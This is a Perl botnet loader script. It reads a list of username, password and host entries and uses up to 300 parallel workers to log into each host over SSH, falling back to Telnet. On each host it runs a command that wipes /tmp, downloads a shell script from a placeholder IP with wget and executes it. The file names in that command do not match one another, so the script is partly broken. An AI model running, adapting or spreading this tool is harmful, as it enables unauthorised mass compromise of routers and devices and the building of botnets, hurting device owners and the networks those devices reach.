#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager; use Net::Telnet;


my $checkTelnet = true;
my $botCmd = 'cd /tmp; rm -rf *; wget IP/boats.sh; chmod +x s.sh; sh bs.sh';

#For Routers & SSH & Telnet etc..

open(fh,'<',$ARGV[0]); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}

# make 10 workers
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < scalar(@newarray); $i+=3) {
        # fork a worker
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        sleep 1;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec($botCmd);
                        sleep 10;
                        $channel->close;
                        print "\e[32;1mSSH:".$newarray[$c].": Command Sent\n";
                               break;
                } else {
                        print "\e[0;34mSSH:".$newarray[$c].": Invalid login\n";
                } 
                                
        } else {
                                print "\e[1;31;1mSSH:".$newarray[$c].": Failed to connect\n";   
                                my $t=new Net::Telnet();
                                if($checkTelnet && $t->open(Host=>$newarray[$c], Timeout=>2)){
                                                my $res=$t->login($newarray[$a],$newarray[$b]);
                                                if ($res){
                                                                $t->cmd($botCmd);
                                                                #my @lines=$t->cmd('show fdb'); #output here
                                                                sleep 10;
                                                                $t->close();
                                                                print "\e[32;1mTelnet:".$newarray[$c].": Command Sent\n";
                                                                break;
                                                } else {
                                                                print "\e[0;34mTelnet:".$newarray[$c].": Invalid login\n";
                                                }
                                } else {
                                                print "\e[1;31;1mTelnet:".$newarray[$c].": Failed to connect\n";   
                                } 
        }
        $pm->finish;
}
$pm->wait_all_children;